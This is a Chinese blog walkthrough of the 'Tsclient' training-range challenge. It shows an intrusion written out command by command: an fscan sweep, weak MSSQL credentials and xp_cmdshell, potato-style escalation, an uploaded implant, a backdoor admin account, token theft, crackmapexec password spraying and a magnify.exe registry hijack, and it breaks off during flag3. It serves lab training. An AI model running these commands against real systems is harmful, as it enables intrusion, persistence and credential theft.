---
title: 春秋云境-Tsclient
url: https://mp.weixin.qq.com/s/hclByp4w0ErA5gstmQvgQw
source: Doonsec's feed
date: 2026-03-16
fetch_date: 2026-03-17T04:11:50.249810
---

# 春秋云境-Tsclient

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/QT8iaU7O4fGNphOp0umJ0D9YWoTIzGFWVVGjh2RlPNwliaJf5jBoicACGfNfZABAQECF9sdpsVE7Naqn5uGYo2OstC0AkKxTfToJtRz1pF4Lag/0?wx_fmt=jpeg)

# 春秋云境-Tsclient

原创

仰恩网安校队
仰恩网安校队

GET不到的FLAG

![]()

在小说阅读器中沉浸阅读

春秋云境Tsclient

Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。

flag1

我们获得目标的ip地址39.99.132.111，使用fscan进行扫描

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGOylZafia3RFQaial7OFm4htV2GsEFlUD1rPDL4jUWWCEibfbjw6u2hMq8B6xcianVic7wvztIg4yIIDAsQibagiaaa8F0veNX1UV1bl8/640?wx_fmt=png)

发现一个80端口和1433端口的服务为mssql暴露在公网，并且存在弱口令

接下来用mdut这个工具去连接mssql，官方链接是https://github.com/SafeGroceryStore/MDUT/releases/tag/v2.1.1

连接了时候很不顺利，去年还好好的今年突然连不上了，驱动报错，我一直在哭。后来排查发现配置文件那里我去年图省事直接解压到C盘，后来迁移了驱动路径没变导致的，给大家踩了个坑

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGMvqnwMBd4tUeLk3BicvnT1IXCo9jgia2xiaRIpbJCj6p5MVn9oTeMe3jHq7V924uwFJVNoCAWibxKRJAHEvKKumW49l2Tvicpq1BnI/640?wx_fmt=png)

尝试激活XP\_Cmdshell组件，并且执行whoami，出现回显

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGPMvbNhlKIgCRdvibO1s92SGSiabIzvyR1uR6xJcGYc23h0icibquDM5B5eLSThomJOxrqg1NiblC97UQ4iblklWddekaia6CXftnrCwA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGNdNibkgfAavz8xMDb57icQPnE7LibkuNuCTQy69SCoHZaTBu1ywY0BjwRWx2C1od4vCbkTtlzUyorQbicKib5xibjfYkgd96s6OnJ4c/640?wx_fmt=png)

我们并没有发现flag文件，并且查看不了图中Administrator底下的文件，打mssql首选甜土豆，上传甜土豆

获得system权限，刚才又吓我一跳，执行的时候说什么sock断连，还好重启了下没事

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGPuWTsh7NRIHQUQFttG15wicDTzFicuNAxOiaSsTEbVLsssccibF6oaRy86OLSEZCibM8AYN3JSHsZKcBm41JPvDlrJHH7L1lH2O0Qo/640?wx_fmt=png)

因为一点问题应该是执行命令的时候没有-a，这里重启下靶场，上传木马，成功上线vshell拿到第一个flag

![](https://mmbiz.qpic.cn/mmbiz_png/QT8iaU7O4fGOqQNtq6UhhHQEmsbaqms7vFI4qo5f06ackeNYPfhU96fley3Qx8RbLzib6ibWnQBVq8AT3KhibFjopytGniauzQnybISNkYfG2ygQ/640?wx_fmt=png)

flag2

上传fscan扫描内网

C:\Users\Administrator\flag>ipconfig

Windows IP 配置

以太网适配器 以太网:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::186e:2015:29a3:dc5c%14
   IPv4 地址 . . . . . . . . . . . . : 172.22.8.18
   子网掩码  . . . . . . . . . . . . : 255.255.0.0
   默认网关. . . . . . . . . . . . . : 172.22.255.253

隧道适配器 isatap.{E309DFD0-37D7-4E89-A23A-3C61210B34EA}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . :

隧道适配器 Teredo Tunneling Pseudo-Interface:

   连接特定的 DNS 后缀 . . . . . . . :
   IPv6 地址 . . . . . . . . . . . . : 2001:0:14c9:d206:1cea:21e3:d89d:8adf
   本地链接 IPv6 地址. . . . . . . . : fe80::1cea:21e3:d89d:8adf%12
   默认网关. . . . . . . . . . . . . : ::

C:\Users\Administrator\flag>fscan.exe -h 172.22.8.18/24

   \_\_\_                              \_
  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
 / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_` |/ \_\_| |/ /
/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   <
\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.8.18     is alive
(icmp) Target 172.22.8.15     is alive
(icmp) Target 172.22.8.31     is alive
(icmp) Target 172.22.8.46     is alive
[\*] Icmp alive hosts len is: 4
172.22.8.46:445 open
172.22.8.31:445 open
172.22.8.18:1433 open
172.22.8.15:445 open
172.22.8.18:445 open
172.22.8.46:139 open
172.22.8.31:139 open
172.22.8.15:139 open
172.22.8.15:88 open
172.22.8.46:135 open
172.22.8.31:135 open
172.22.8.18:139 open
172.22.8.15:135 open
172.22.8.18:135 open
172.22.8.46:80 open
172.22.8.18:80 open
[\*] alive ports len is: 16
start vulscan
[\*] NetInfo
[\*]172.22.8.31
   [->]WIN19-CLIENT
   [->]172.22.8.31
[\*] NetInfo
[\*]172.22.8.46
   [->]WIN2016
   [->]172.22.8.46
[\*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01
[\*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT
[\*] NetInfo
[\*]172.22.8.15
   [->]DC01
   [->]172.22.8.15
[\*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server
[\*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393
[\*] NetInfo
[\*]172.22.8.18
   [->]WIN-WEB
   [->]172.22.8.18
   [->]2001:0:14c9:d206:1cea:21e3:d89d:8adf
[\*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server
[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ

172.22.8.15 (DC01)
├── 角色: 域控制器 ⭐
├── 证据:
│   ├── 88端口开放 (Kerberos)
│   ├── NetBios显示 "DC:XIAORANG\DC01"
│   └── 主机名 DC01
└── 重要性: 内网核心，拿下即可控制整个域

172.22.8.18 (WIN-WEB)
├── 角色: Web服务器
├── 服务: IIS (80端口), SQL Server (1433)
└── 状态: 已控 ✅

172.22.8.46 (WIN2016)
├── 角色: 另一台Web服务器
├── 服务: IIS (80端口)
└── 状态: 待攻击

172.22.8.31 (WIN19-CLIENT)
├── 角色: 域内客户端
└── 状态: 待横向移动

同时在flag01.txt中结尾给了一句提示：Maybe you should focus on user sessions，注意会话信息

quser命令 # 查看当前服务器用户连接状态

C:\Users\Administrator\flag>quser
 用户名                会话名             ID  状态    空闲时间   登录时间
 john                  rdp-tcp#0           2  运行中         33  2026/3/16 16:38

发现用户john的会话，因为用的是vshell插件没那么好，那就按部就班的渗透，下一个靶场开始用cs

我们知道john是存在令牌的，可以尝试进行令牌窃取

我们先在机器上创建用户

net user test Admin@123 /add
net localgroup administrators test /add

然后用proxifier设置全局代理，进行rdp连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGP5JonjTWRNzbttnxBicraHSBEjacEMshU51G0XxZDLx3P6NuhYRqLfsY3rJXvxCQSsrNc1Me4bBswWNhmntT9uUNJI3a5dmQ00/640?wx_fmt=png)

mstsc成功连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGPVPWjia4UhzlL7LhIDZujh66s1m9jWBT7NF3s1nFBlC43FOVkaV5zPDv06IXVVdia6z9V3CMoA5udpalTHXaeZW3vB3iaL0R5fpU/640?wx_fmt=png)

同样进行上线

SharpToken.exe execute "WIN-WEB\John" cmd true

使用ShrakToken来抓取John的令牌，发现有一个问题

![](https://mmbiz.qpic.cn/mmbiz_png/QT8iaU7O4fGNeTIfwFONOOq3NxgGEYnSb3egNuoJQon94yPoahRCdq7OtEY68icE4wczY0hAqI8vogNJv7ia5vzyVB75YW1acbvFoAGtiaqKpUY/640?wx_fmt=png)

说起来这个问题曾经在我物理机上出现过，当时网上找遍了各种方法都不行，最后还是在闲鱼找人安装了（笑）

由于刚才手贱点了重新启动，导致我不得不重启整个靶场，因为john下线了

这次终于成功了

![](https://mmbiz.qpic.cn/mmbiz_png/QT8iaU7O4fGPHJfSoNEAiaQiaODNPqvw3N4jhuI69FAOt5C0FiaNEExk0tzIbdyNW3clcvhg8j4HMv2dRDVKccId29sQicQDBLBMLotW0vwyeh5s/640?wx_fmt=png)

我们执行net use，用John查看共享资源

net use命令用于显示当前用户建立的网络连接列表。如果john用户之前连接过某些共享文件夹（例如，访问过文件服务器上的共享），那么这些连接信息可能会暴露重要的内部资源位置，甚至可能包含自动登录的凭据。通过检查这些共享连接，攻击者可以找到额外的目标系统或敏感文件，这是横向移动和信息收集的重要步骤。

查看里面的敏感文件，发现有一个凭证和提示（你知道如何劫持图片吗？显然看出这里要我们镜像劫持）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGM0ciahumLPaB7TSQ1CmMWmC1bo3AmXia1K7RZhwHy2Sk1574AjB7fQ2j1P2iaicDyNrhW4bsb4ibUPzqzicHzR3MdzVWQ8oZbhoiaQv8/640?wx_fmt=png)

对内网机器进行密码喷洒

proxychains crackmapexec smb 172.22.8.1/24 -u Aldrich -p 'Ald@rLMWuy7Z!#' -d xiaorang.lab 2>/dev/null

![](https://mmbiz.qpic.cn/mmbiz_png/QT8iaU7O4fGP2diaibRl4Qo9dd5DAlHzAAbicicpogn5eQ058FKI6njphefzZYh71GteSM3HYeTWqCx6rtIMtkzU8MTbkmHuvfmMJUH14z85uJkY/640?wx_fmt=png)

登录172.22.8.46（参考别的wp说只有这个可以）

proxychains rdesktop 172.22.8.46

在这里登录后会提示你改密码，改完密码后终于可以用mstsc登录了，linux那个太反人类了

查看权限发现我们是普通用户

![](https://mmbiz.qpic.cn/mmbiz_png/QT8iaU7O4fGNnbxMO1iag3C7uZ9ibayfR7uSDXRzRVqCibiaOMS2O5SWwmgeAQoe2JxGHxNjeresXvVQzksv4lU6c5k6OtD9tu4mlh3FcmC4fqCE/640?wx_fmt=png)

在powershell运行这题命令可以看到登录用户都有修改注册表的权限

get-acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl \*

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGNnoADicTRBLwXibVmnzrgv6rceZQCvpWuASq0aHYWIHakPsiaTxo5Wib5njibjCMagVL2H1khNVXaibgLyuwlxUwWAMP3zFJW9DF60Y/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGO44cPJXRFWlD0yOIG674j07M4Qqq8f0yERdvtiaejyVWicDzuXetkbOfDd6yoPqMNjV6auQSoCAXXRtgOI4A5WnMybd83caLL08/640?wx_fmt=png)

因此可以修改注册表映像劫持，使用放大镜进行提权

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG\_SZ /d "C:\windows\system32\cmd.exe"

我们先锁定用户。然后再点击放大镜就会弹出cms窗口

这条命令是一个非常经典的Windows权限维持/提权技巧——利用放大镜劫持

这时候电脑有点卡了，搞个马上线继续

尴尬，发现不出网，直接拿flag

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QT8iaU7O4fGM7Ruia4MjxzGjJWak560o03cc0ZEYEDR5nqaHuloDCEK5rGyZcibfRkeiaK21N6M28p9ANNCJFImZaSzBMdDSatCIKXa789Yul2Q/640?wx_fmt=png)

flag{5d34ffd8-34af-4dfa-b1f6-1dbfa72f4162}

flag3

查看域控管理员

net group "domain admins" /domain
net config workstation

C:\Users\Aldrich>net config workstation
计算机名                     \\...